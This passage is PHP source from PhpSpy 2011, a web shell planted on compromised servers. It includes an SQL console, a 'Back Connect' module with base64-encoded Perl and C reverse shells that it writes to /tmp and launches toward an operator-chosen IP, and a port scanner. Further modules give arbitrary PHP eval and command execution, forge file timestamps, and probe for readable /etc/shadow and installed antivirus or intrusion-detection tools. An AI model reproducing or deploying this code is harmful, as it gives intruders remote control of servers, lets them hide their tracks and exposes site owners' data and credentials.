                $query = q("SHOW DATABASES");
                $dbs = array();
                $dbs[] = '-- Select a database --';
                while($db = mysql_fetch_array($query)) {
                    $dbs[$db['Database']] = $db['Database'];
                }
                makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
                $tabledb = array();
                if ($dbname) {
                    p('<p>');
                    p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
                    if ($tablename) {
                        p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
                    }
                    p('</p>');
                    mysql_select_db($dbname);
        
                    $getnumsql = '';
                    $runquery = 0;
                    if ($sql_query) {
                        $runquery = 1;
                    }
                    $allowedit = 0;
                    if ($tablename && !$sql_query) {
                        $sql_query = "SELECT * FROM $tablename";
                        $getnumsql = $sql_query;
                        $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
                        $allowedit = 1;
                    }
                    p('<form action="'.$self.'" method="POST">');
                    p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
                    makehide('tablename', $tablename);
                    makehide('action','mysqladmin');
                    p($dbform);
                    p('</form>');
                    if ($tablename || ($runquery && $sql_query)) {
                        if ($doing == 'structure') {
                            $result = q("SHOW FULL COLUMNS FROM $tablename");
                            $rowdb = array();
                            while($row = mysql_fetch_array($result)) {
                                $rowdb[] = $row;
                            }
                            p('<h3>Structure</h3>');
                            p('<table border="0" cellpadding="3" cellspacing="0">');
                            p('<tr class="head">');
                            p('<td>Field</td>');
                            p('<td>Type</td>');
                            p('<td>Collation</td>');
                            p('<td>Null</td>');
                            p('<td>Key</td>');
                            p('<td>Default</td>');
                            p('<td>Extra</td>');
                            p('<td>Privileges</td>');
                            p('<td>Comment</td>');
                            p('</tr>');
                            foreach ($rowdb as $row) {
                                $thisbg = bg();
                                p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                                p('<td>'.$row['Field'].'</td>');
                                p('<td>'.$row['Type'].'</td>');
                                p('<td>'.$row['Collation'].'&nbsp;</td>');
                                p('<td>'.$row['Null'].'&nbsp;</td>');
                                p('<td>'.$row['Key'].'&nbsp;</td>');
                                p('<td>'.$row['Default'].'&nbsp;</td>');
                                p('<td>'.$row['Extra'].'&nbsp;</td>');
                                p('<td>'.$row['Privileges'].'&nbsp;</td>');
                                p('<td>'.$row['Comment'].'&nbsp;</td>');
                                p('</tr>');
                            }
                            tbfoot();
                            $result = q("SHOW INDEX FROM $tablename");
                            $rowdb = array();
                            while($row = mysql_fetch_array($result)) {
                                $rowdb[] = $row;
                            }
                            p('<h3>Indexes</h3>');
                            p('<table border="0" cellpadding="3" cellspacing="0">');
                            p('<tr class="head">');
                            p('<td>Keyname</td>');
                            p('<td>Type</td>');
                            p('<td>Unique</td>');
                            p('<td>Packed</td>');
                            p('<td>Seq_in_index</td>');
                            p('<td>Field</td>');
                            p('<td>Cardinality</td>');
                            p('<td>Collation</td>');
                            p('<td>Null</td>');
                            p('<td>Comment</td>');
                            p('</tr>');
                            foreach ($rowdb as $row) {
                                $thisbg = bg();
                                p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                                p('<td>'.$row['Key_name'].'</td>');
                                p('<td>'.$row['Index_type'].'</td>');
                                p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
                                p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
                                p('<td>'.$row['Seq_in_index'].'</td>');
                                p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
                                p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
                                p('<td>'.$row['Collation'].'&nbsp;</td>');
                                p('<td>'.$row['Null'].'&nbsp;</td>');
                                p('<td>'.$row['Comment'].'&nbsp;</td>');
                                p('</tr>');
                            }
                            tbfoot();
                        } elseif ($doing == 'insert' || $doing == 'edit') {
                            $result = q('SHOW COLUMNS FROM '.$tablename);
                            while ($row = mysql_fetch_array($result)) {
                                $rowdb[] = $row;
                            }
                            $rs = array();
                            if ($doing == 'insert') {
                                p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
                            } else {
                                p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
                                $where = base64_decode($base64);
                                $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                                $rs = mysql_fetch_array($result);
                            }
                            p('<form method="post" action="'.$self.'">');
                            p($dbform);
                            makehide('action','mysqladmin');
                            makehide('tablename',$tablename);
                            p('<table border="0" cellpadding="3" cellspacing="0">');
                            foreach ($rowdb as $row) {
                                if ($rs[$row['Field']]) {
                                    $value = htmlspecialchars($rs[$row['Field']]);
                                } else {
                                    $value = '';
                                }
                                $thisbg = bg();
                                p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                                if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
                                    p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
                                } else {                            
                                    p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
                                }
                            }
                            if ($doing == 'insert') {
                                p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                            } else {
                                p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                                makehide('base64', $base64);
                            }
                            p('</table></form>');
                        } else {
                            $querys = @explode(';',$sql_query);
                            foreach($querys as $num=>$query) {
                                if ($query) {
                                    p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
                                    switch(qy($query))
                                    {
                                        case 0:
                                            p('<h2>Error : '.mysql_error().'</h2>');
                                            break;  
                                        case 1:
                                            if (strtolower(substr($query,0,13)) == 'select * from') {
                                                $allowedit = 1;
                                            }
                                            if ($getnumsql) {
                                                $tatol = mysql_num_rows(q($getnumsql));
                                                $multipage = multi($tatol, $pagenum, $page, $tablename);
                                            }
                                            if (!$tablename) {
                                                $sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
                                                $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                                preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
                                                $tablename = $matches[1][0];
                                            }
        
                                            /*********************/
                                            $getfield = q("SHOW COLUMNS FROM $tablename");
                                            $rowdb = array();
                                            $keyfied = ''; //主键字段
                                            while($row = @mysql_fetch_assoc($getfield)) {
                                                $rowdb[$row['Field']]['Key'] = $row['Key'];
                                                $rowdb[$row['Field']]['Extra'] = $row['Extra'];
                                                if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
                                                    $keyfied = $row['Field'];
                                                }
                                            }
                                            /*********************/                                 
                                            //直接浏览表按照主键降序排列
                                            if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
                                                $query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
                                            }
        
                                            $result = q($query);
        
                                            p($multipage);
                                            p('<table border="0" cellpadding="3" cellspacing="0">');
                                            p('<tr class="head">');
                                            if ($allowedit) p('<td>Action</td>');
                                            $fieldnum = @mysql_num_fields($result);
                                            for($i=0;$i<$fieldnum;$i++){
                                                $name = @mysql_field_name($result, $i);
                                                $type = @mysql_field_type($result, $i);
                                                $len = @mysql_field_len($result, $i);
                                                p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
                                            }
                                            p('</tr>');
                                            
                                            while($mn = @mysql_fetch_assoc($result)){
                                                $thisbg = bg();
                                                p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                                                $where = $tmp = $b1 = '';
                                                //选取条件字段用
                                                foreach($mn as $key=>$inside){
                                                    if ($inside) {
                                                        //查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。
                                                        if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
                                                            $where = $key."='".addslashes($inside)."'";
                                                            break;
                                                        }
                                                        $where .= $tmp.$key."='".addslashes($inside)."'";
                                                        $tmp = ' AND ';
                                                    }
                                                }
                                                //读取记录用
                                                foreach($mn as $key=>$inside){
                                                    $b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
                                                }
                                                $where = base64_encode($where);
        
                                                if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
        
                                                p($b1);
                                                p('</tr>');
                                                unset($b1);
                                            }
                                            p('<tr class="head">');
                                            if ($allowedit) p('<td>Action</td>');
                                            $fieldnum = @mysql_num_fields($result);
                                            for($i=0;$i<$fieldnum;$i++){
                                                $name = @mysql_field_name($result, $i);
                                                $type = @mysql_field_type($result, $i);
                                                $len = @mysql_field_len($result, $i);
                                                p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
                                            }
                                            p('</tr>');
                                            tbfoot();
                                            p($multipage);
                                            break;
                                        case 2:
                                            $ar = mysql_affected_rows();
                                            p('<h2>affected rows : <b>'.$ar.'</b></h2>');
                                            break;
                                    }
                                }
                            }
                        }
                    } else {
                        $query = q("SHOW TABLE STATUS");
                        $table_num = $table_rows = $data_size = 0;
                        $tabledb = array();
                        while($table = mysql_fetch_array($query)) {
                            $data_size = $data_size + $table['Data_length'];
                            $table_rows = $table_rows + $table['Rows'];
                            $table['Data_length'] = sizecount($table['Data_length']);
                            $table_num++;
                            $tabledb[] = $table;
                        }
                        $data_size = sizecount($data_size);
                        unset($table);
                        p('<table border="0" cellpadding="0" cellspacing="0">');
                        p('<form action="'.$self.'" method="POST">');
                        makehide('action','mysqladmin');
                        p($dbform);
                        p('<tr class="head">');
                        p('<td width="2%" align="center">&nbsp;</td>');
                        p('<td>Name</td>');
                        p('<td>Rows</td>');
                        p('<td>Data_length</td>');
                        p('<td>Create_time</td>');
                        p('<td>Update_time</td>');
                        if ($highver) {
                            p('<td>Engine</td>');
                            p('<td>Collation</td>');
                        }
                        p('<td>Operate</td>');
                        p('</tr>');
                        foreach ($tabledb as $key => $table) {
                            $thisbg = bg();
                            p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                            p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
                            p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
                            p('<td>'.$table['Rows'].'</td>');
                            p('<td>'.$table['Data_length'].'</td>');
                            p('<td>'.$table['Create_time'].'&nbsp;</td>');
                            p('<td>'.$table['Update_time'].'&nbsp;</td>');
                            if ($highver) {
                                p('<td>'.$table['Engine'].'</td>');
                                p('<td>'.$table['Collation'].'</td>');
                            }
                            p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
                            p('</tr>');
                        }
                        p('<tr class="head">');
                        p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                        p('<td>Name</td>');
                        p('<td>Rows</td>');
                        p('<td>Data_length</td>');
                        p('<td>Create_time</td>');
                        p('<td>Update_time</td>');
                        if ($highver) {
                            p('<td>Engine</td>');
                            p('<td>Collation</td>');
                        }
                        p('<td>Operate</td>');
                        p('</tr>');
                        p('<tr class='.bg().'>');
                        p('<td>&nbsp;</td>');
                        p('<td>Total tables: '.$table_num.'</td>');
                        p('<td>'.$table_rows.'</td>');
                        p('<td>'.$data_size.'</td>');
                        p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
                        p('</tr>');
        
                        p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
                        makehide('doing','backupmysql');
                        formfoot();
                        p("</table>");
                        fr($query);
                    }
                }
            }
            tbfoot();
            @mysql_close();
        }//end mysql
        
        elseif ($action == 'backconnect') {
            !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
            !$yourport && $yourport = '12345';
            $usedb = array('perl'=>'perl','c'=>'c');
        
            $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
                "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
                "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
                "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
                "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
                "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
                "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
            $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
                "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
                "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
                "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
                "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
                "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
                "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
                "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
        
            if ($start && $yourip && $yourport && $use){
                if ($use == 'perl') {
                    cf('/tmp/angel_bc',$back_connect);
                    $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
                } else {
                    cf('/tmp/angel_bc.c',$back_connect_c);
                    $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
                    @unlink('/tmp/angel_bc.c');
                    $res = execute("/tmp/angel_bc $yourip $yourport &");
                }
                m("Now script try connect to $yourip port $yourport ...");
            }
        
            formhead(array('title'=>'Back Connect'));
            makehide('action','backconnect');
            p('<p>');
            p('Your IP:');
            makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
            p('Your Port:');
            makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
            p('Use:');
            makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
            makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
            p('</p>');
            formfoot();
        }//end
        
        elseif ($action == 'portscan') {
            !$scanip && $scanip = '127.0.0.1';
            !$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
            formhead(array('title'=>'Port Scan'));
            makehide('action','portscan');
            p('<p>');
            p('IP:');
            makeinput(array('name'=>'scanip','size'=>20,'value'=>$scanip));
            p('Port:');
            makeinput(array('name'=>'scanport','size'=>80,'value'=>$scanport));
            makeinput(array('name'=>'startscan','value'=>'Scan','type'=>'submit','class'=>'bt'));
            p('</p>');
            formfoot();
        
            if ($startscan) {
                p('<h2>Result &raquo;</h2>');
                p('<ul class="info">');
                foreach(explode(',', $scanport) as $port) {
                    $fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1); 
                    if (!$fp) {
                        p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
                   } else {
                        p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
                        @fclose($fp);
                   } 
                }
                p('</ul>');
            }
        }
        
        elseif ($action == 'eval') {
            $phpcode = trim($phpcode);
            if($phpcode){
                if (!preg_match('#<\?#si', $phpcode)) {
                    $phpcode = "<?php\n\n{$phpcode}\n\n?>";
                }
                eval("?".">$phpcode<?");
            }
            formhead(array('title'=>'Eval PHP Code'));
            makehide('action','eval');
            maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
            p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
            formfooter();
        }//end eval
        
        elseif ($action == 'editfile') {
            if(file_exists($opfile)) {
                $fp=@fopen($opfile,'r');
                $contents=@fread($fp, filesize($opfile));
                @fclose($fp);
                $contents=htmlspecialchars($contents);
            }
            formhead(array('title'=>'Create / Edit File'));
            makehide('action','file');
            makehide('dir',$nowpath);
            makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
            maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
            formfooter();
            
            goback();
        
        }//end editfile
        
        elseif ($action == 'newtime') {
            $opfilemtime = @filemtime($opfile);
            //$time = strtotime("$year-$month-$day $hour:$minute:$second");
            $cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
            formhead(array('title'=>'Clone folder/file was last modified time'));
            makehide('action','file');
            makehide('dir',$nowpath);
            makeinput(array('title'=>'Alter folder/file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
            makeinput(array('title'=>'Reference folder/file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
            formfooter();
            formhead(array('title'=>'Set last modified'));
            makehide('action','file');
            makehide('dir',$nowpath);
            makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
            p('<p>year:');
            makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
            p('month:');
            makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
            p('day:');
            makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
            p('hour:');
            makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
            p('minute:');
            makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
            p('second:');
            makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
            p('</p>');
            formfooter();
            goback();
        }//end newtime
        
        elseif ($action == 'shell') {
            if (IS_WIN && IS_COM) {
                if($program && $parameter) {
                    $shell= new COM('Shell.Application');
                    $a = $shell->ShellExecute($program,$parameter);
                    m('Program run has '.(!$a ? 'success' : 'fail'));
                }
                !$program && $program = 'c:\windows\system32\cmd.exe';
                !$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
                formhead(array('title'=>'Execute Program'));
                makehide('action','shell');
                makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
                p('<p>');
                makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
                makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
                p('</p>');
                formfoot();
            }
            formhead(array('title'=>'Execute Command'));
            makehide('action','shell');
            if (IS_WIN && IS_COM) {
                $execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
                makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
            }
            p('<p>');
            makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
            makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
            p('</p>');
            formfoot();
        
            if ($command) {
                p('<hr width="100%" noshade /><pre>');
                if ($execfunc=='wscript' && IS_WIN && IS_COM) {
                    $wsh = new COM('WScript.shell');
                    $exec = $wsh->exec('cmd.exe /c '.$command);
                    $stdout = $exec->StdOut();
                    $stroutput = $stdout->ReadAll();
                    echo $stroutput;
                } elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
                    $descriptorspec = array(
                       0 => array('pipe', 'r'),
                       1 => array('pipe', 'w'),
                       2 => array('pipe', 'w')
                    );
                    $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        fwrite($pipes[0], $command."\r\n");
                        fwrite($pipes[0], "exit\r\n");
                        fclose($pipes[0]);
                        while (!feof($pipes[1])) {
                            echo fgets($pipes[1], 1024);
                        }
                        fclose($pipes[1]);
                        while (!feof($pipes[2])) {
                            echo fgets($pipes[2], 1024);
                        }
                        fclose($pipes[2]);
                        proc_close($process);
                    }
                } else {
                    echo(execute($command));
                }
                p('</pre>');
            }
        }//end shell
        
        elseif ($action == 'phpenv') {
            $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
            $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
            !$dis_func && $dis_func = 'No';     
            $info = array(
                1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
                2 => array('Server Domain',$_SERVER['SERVER_NAME']),
                3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
                4 => array('Server OS',PHP_OS),
                5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
                6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
                7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
                8 => array('PHP run mode',strtoupper(php_sapi_name())),
                9 => array('The file path',__FILE__),
        
                10 => array('PHP Version',PHP_VERSION),
                11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
                12 => array('Safe Mode',getcfg('safe_mode')),
                13 => array('Administrator',$adminmail),
                14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
                15 => array('enable_dl',getcfg('enable_dl')),
                16 => array('display_errors',getcfg('display_errors')),
                17 => array('register_globals',getcfg('register_globals')),
                18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
                19 => array('memory_limit',getcfg('memory_limit')),
                20 => array('post_max_size',getcfg('post_max_size')),
                21 => array('upload_max_filesize',$upsize),
                22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
                23 => array('disable_functions',$dis_func),
            );
        
            if($phpvarname) {
                m($phpvarname .' : '.getcfg($phpvarname));
            }
        
            formhead(array('title'=>'Server environment'));
            makehide('action','phpenv');
            makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
            formfooter();
        
            $hp = array(0=> 'Server', 1=> 'PHP');
            for($a=0;$a<2;$a++) {
                p('<h2>'.$hp[$a].' &raquo;</h2>');
                p('<ul class="info">');
                if ($a==0) {
                    for($i=1;$i<=9;$i++) {
                        p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
                    }
                } elseif ($a == 1) {
                    for($i=10;$i<=23;$i++) {
                        p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
                    }
                }
                p('</ul>');
            }
        }//end phpenv
        
        elseif ($action == 'secinfo') {
            
            secparam('Server software', @getenv('SERVER_SOFTWARE'));
            secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
            secparam('Open base dir', @ini_get('open_basedir'));
            secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
            secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
            secparam('cURL support', function_exists('curl_version')?'enabled':'no');
            $temp=array();
            if(function_exists('mysql_get_client_info'))
                $temp[] = "MySql (".mysql_get_client_info().")";
            if(function_exists('mssql_connect'))
                $temp[] = "MSSQL";
            if(function_exists('pg_connect'))
                $temp[] = "PostgreSQL";
            if(function_exists('oci_connect'))
                $temp[] = "Oracle";
            secparam('Supported databases', implode(', ', $temp));
            
            if( !IS_WIN ) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
                secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
                secparam('OS version', @file_get_contents('/proc/version'));
                secparam('Distr name', @file_get_contents('/etc/issue.net'));
                $safe_mode = @ini_get('safe_mode');
                if(!$GLOBALS['safe_mode']) {
                    $temp=array();
                    foreach ($userful as $item)
                        if(which($item)){$temp[]=$item;}
                    secparam('Userful', implode(', ',$temp));
                    $temp=array();
                    foreach ($danger as $item)
                        if(which($item)){$temp[]=$item;}
                    secparam('Danger', implode(', ',$temp));
                    $temp=array();
                    foreach ($downloaders as $item) 
                        if(which($item)){$temp[]=$item;}
                    secparam('Downloaders', implode(', ',$temp));
                    secparam('Hosts', @file_get_contents('/etc/hosts'));
                    secparam('HDD space', execute('df -h'));
                    secparam('Mount options', @file_get_contents('/etc/fstab'));
                }
            } else {
                secparam('OS Version',execute('ver'));
                secparam('Account Settings',execute('net accounts'));
                secparam('User Accounts',execute('net user'));
                secparam('IP Configurate',execute('ipconfig -all'));
            }
        }//end
        
        else {
            m('Undefined Action');
        }
        
        ?>
        </td></tr></table>
        <div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
            <span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
            Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
        </div>
        </body>
        </html>
        
        <?php
        
        /*======================================================
        函数库
        ======================================================*/
        
        function secparam($n, $v) {
            $v = trim($v);
            if($v) {
                p('<h2>'.$n.' &raquo;</h2>');
                p('<div class="infolist">');
                if(strpos($v, "\n") === false)
                    p($v.'<br />');
                else
                    p('<pre>'.$v.'</pre>');
                p('</div>');
            }
        }
        function m($msg) {
